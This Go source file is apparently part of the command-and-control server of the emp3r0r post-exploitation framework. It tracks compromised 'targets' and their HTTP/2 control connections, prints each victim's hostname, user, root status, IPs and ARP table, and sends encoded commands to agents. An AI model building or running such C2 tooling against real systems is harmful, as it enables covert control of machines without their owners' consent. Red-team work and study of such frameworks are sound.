package cc

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/posener/h2conn"
)

var (
	// DebugLevel what kind fof logs do we want to see
	// 0 (INFO) -> 1 (WARN) -> 2 (ERROR)
	DebugLevel = 0

	// IsAPIEnabled Indicate whether we are in headless mode
	IsAPIEnabled = false

	// EmpRoot root directory of emp3r0r
	EmpRoot, _ = os.Getwd()

	// Targets target list, with control (tun) interface
	Targets = make(map[*agent.SystemInfo]*Control)
)

const (
	// Temp where we save temp files
	Temp = "/tmp/emp3r0r/"

	// WWWRoot host static files for agent
	WWWRoot = Temp + tun.FileAPI

	// FileGetDir where we save #get files
	FileGetDir = "file-get/"
)

// Control controller interface of a target
type Control struct {
	Index int
	Conn  *h2conn.Conn
}

// send JSON encoded target list to frontend
func headlessListTargets() (err error) {
	var targets []agent.SystemInfo
	for target := range Targets {
		targets = append(targets, *target)
	}
	data, err := json.Marshal(targets)
	if err != nil {
		return
	}
	var resp APIResponse
	resp.Cmd = "ls_targets"
	resp.MsgData = data
	resp.MsgType = JSON
	resp.Alert = false
	respdata, err := json.Marshal(resp)
	if err != nil {
		return
	}
	_, err = APIConn.Write([]byte(respdata))
	return
}

// ListTargets list currently connected agents
func ListTargets() {
	// return JSON data to APIConn in headless mode
	if IsAPIEnabled {
		if err := headlessListTargets(); err != nil {
			CliPrintError("ls_targets: %v", err)
		}
	}

	color.Cyan("Connected agents\n")
	color.Cyan("=================\n\n")

	indent := strings.Repeat(" ", len(" [0] "))
	for target, control := range Targets {
		hasInternet := color.HiRedString("NO")
		if target.HasInternet {
			hasInternet = color.HiGreenString("YES")
		}

		// split long lines
		splitLongLine := func(line string, titleLen int) (ret string) {
			if len(line) < 55 {
				return line
			}
			ret = line[:55]
			for i := 1; i <= len(line)/55; i++ {
				if i == 4 {
					break
				}
				endslice := 55 * (i + 1)
				if endslice >= len(line) {
					endslice = len(line)
				}
				ret += fmt.Sprintf("\n%s%s", strings.Repeat(" ", 25-titleLen), line[55*i:endslice])
			}

			return
		}
		arpTab := splitLongLine(strings.Join(target.ARP, ", "), 4)
		ips := splitLongLine(strings.Join(target.IPs, ", "), 4)
		target.User = splitLongLine(target.User, 5)
		userInfo := color.HiRedString(target.User)
		if target.HasRoot {
			userInfo = color.HiGreenString(target.User)
		}
		cpuinfo := color.HiMagentaString(splitLongLine(target.CPU, 4))

		// agent process info
		agentProc := *target.Process
		procInfo := splitLongLine(fmt.Sprintf("%s (%d) <- %s (%d)",
			agentProc.Cmdline, agentProc.PID, agentProc.Parent, agentProc.PPID), 4)

		// info map
		infoMap := map[string]string{
			"Hostname":  color.HiCyanString(splitLongLine(target.Hostname, 3)),
			"Process":   color.HiMagentaString(procInfo),
			"User":      userInfo,
			"Internet":  hasInternet,
			"CPU":       cpuinfo,
			"MEM":       target.Mem,
			"Hardware":  color.HiCyanString(target.Hardware),
			"Container": target.Container,
			"OS":        color.HiWhiteString(target.OS),
			"Kernel":    color.HiBlueString(target.Kernel) + ", " + color.HiWhiteString(target.Arch),
			"From":      color.HiYellowString(target.IP) + fmt.Sprintf(" - %s", color.HiGreenString(target.Transport)),
			"IPs":       color.BlueString(ips),
			"ARP":       color.HiWhiteString(arpTab),
		}

		// print
		fmt.Printf(" [%s] Tag: %s", color.CyanString("%d", control.Index), strings.Repeat(" ", (14-len("Tag")))+
			color.CyanString(splitLongLine(target.Tag, 3)))

		for key, val := range infoMap {
			fmt.Printf("\n%s%s:%s%s", indent, key, strings.Repeat(" ", (15-len(key))), val)
		}
		fmt.Print("\n\n\n\n")
	}
}

// GetTargetFromIndex find target from Targets via control index
func GetTargetFromIndex(index int) (target *agent.SystemInfo) {
	for t, ctl := range Targets {
		if ctl.Index == index {
			target = t
			break
		}
	}
	return
}

// GetTargetFromTag find target from Targets via tag
func GetTargetFromTag(tag string) (target *agent.SystemInfo) {
	for t := range Targets {
		if t.Tag == tag {
			target = t
			break
		}
	}
	return
}

// ListModules list all available modules
func ListModules() {
	CliPrettyPrint("Module Name", "Help", &agent.ModuleDocs)
}

// Send2Agent send MsgTunData to agent
func Send2Agent(data *agent.MsgTunData, agent *agent.SystemInfo) (err error) {
	ctrl := Targets[agent]
	if ctrl == nil {
		return errors.New("Send2Agent: Target is not connected")
	}
	out := json.NewEncoder(ctrl.Conn)

	err = out.Encode(data)
	return
}
